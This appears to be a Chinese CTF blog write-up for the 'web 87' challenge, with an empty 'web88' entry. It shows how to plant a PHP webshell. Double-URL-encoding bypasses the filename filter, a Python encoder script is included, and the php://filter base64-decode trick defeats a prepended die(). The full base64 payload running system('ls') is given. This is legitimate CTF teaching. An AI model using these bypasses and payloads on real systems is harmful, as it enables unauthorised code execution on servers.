-<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
-<p>这题目的是写入木马，并成功执行木马</p>
-<p>分析一波:</p>
-<p>这里的文件名中不能有php，data，：，.</p>
-<p>并且木马写上去后还会先执行死亡程序，不会执行木马</p>
-<p>该怎么做</p>
-<p>先要了解一下<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
-<p>这里是打开一个中间流，如果我们在文件名那里写上这个的话，那么<code>file_put_contents()</code>会这样做，把第二个参数的值以base64解码，并且写到flag.php文件中，接下来就介绍如何突破限制</p>
-<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>既然我们要写上上面的payload，那么该如何绕过，可以看到下面还有一层url解码，所以这里可以双重url编码绕过，自己用python写了个脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
-<h2 id="绕过死亡"><a href="#绕过死亡" class="headerlink" title="绕过死亡"></a>绕过死亡</h2><p>前面提到会以base64解码的形式写入，介绍一下base64解码的过程</p>
-<p>1.筛选字符，把不属于65个base64字符去掉</p>
-<p>2.解码，每四个base64字符为一组解码</p>
-<p>我们这样来操作一下<?php die('大佬别秀了');?></p>
-<p>第一步剩下phpdie</p>
-<p>第二步，由于只有6个字符，解码失败，所以我们要手动添加两个字符，给它乱解即可，反正最后执行我们的php代码即可</p>
-<p>所以payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aa是自己加的，后面的是<?php system('ls');?></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
-<p>最后再切换命令查看flag即可</p>
-<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
-]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
       </tags>
   </entry>
 </search>
